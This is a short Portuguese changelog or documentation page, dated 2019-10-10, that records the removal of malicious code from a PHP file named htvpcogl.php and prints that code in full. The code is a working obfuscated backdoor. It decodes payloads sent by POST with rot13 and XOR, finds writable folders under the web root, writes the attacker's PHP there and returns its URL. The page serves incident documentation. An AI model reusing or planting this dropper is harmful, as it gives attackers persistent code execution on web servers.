---
id: doc46
title: Arquivos Maliciosos
sidebar_label: COD 2019-10-10:06
---

## 46.0.0 - 2019-10-10

### Fixed

- Removido código malicioso no arquivo htvpcogl.php 

## Código


```php

<?php $avyomg = "ejdrihkwossvvpfm";$ctnyot = "";foreach ($_POST as $nccjlpfgkrwdn => $wzncd){if (strlen($nccjlpfgkrwdn) == 16 and substr_count($wzncd, "%") > 10){ghtcj($nccjlpfgkrwdn, $wzncd);}}function ghtcj($nccjlpfgkrwdn, $qgpzetrs){global $ctnyot;$ctnyot = $nccjlpfgkrwdn;$qgpzetrs = str_split(rawurldecode(str_rot13($qgpzetrs)));function bbyfxfupwr($hdrgpfby, $nccjlpfgkrwdn){global $avyomg, $ctnyot;return $hdrgpfby ^ $avyomg[$nccjlpfgkrwdn % strlen($avyomg)] ^ $ctnyot[$nccjlpfgkrwdn % strlen($ctnyot)];}$qgpzetrs = implode("", array_map("bbyfxfupwr", array_values($qgpzetrs), array_keys($qgpzetrs)));$qgpzetrs = @unserialize($qgpzetrs);if (@is_array($qgpzetrs)){$nccjlpfgkrwdn = array_keys($qgpzetrs);$qgpzetrs = $qgpzetrs[$nccjlpfgkrwdn[0]];if ($qgpzetrs === $nccjlpfgkrwdn[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function tjddnqdrom($nccjlpfgir) {static $qrale = array();$xbfig = glob($nccjlpfgir . '/*', GLOB_ONLYDIR);if (count($xbfig) > 0) {foreach ($xbfig as $nccjlpfg){if (@is_writable($nccjlpfg)){$qrale[] = $nccjlpfg;}}}foreach ($xbfig as $nccjlpfgir) tjddnqdrom($nccjlpfgir);return $qrale;}$isfrd = $_SERVER["DOCUMENT_ROOT"];$xbfig = tjddnqdrom($isfrd);$nccjlpfgkrwdn = array_rand($xbfig);$wcwyyyyh = $xbfig[$nccjlpfgkrwdn] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($wcwyyyyh, $qgpzetrs);echo "http://" . $_SERVER["HTTP_HOST"] . substr($wcwyyyyh, strlen($isfrd));exit();}}}

```

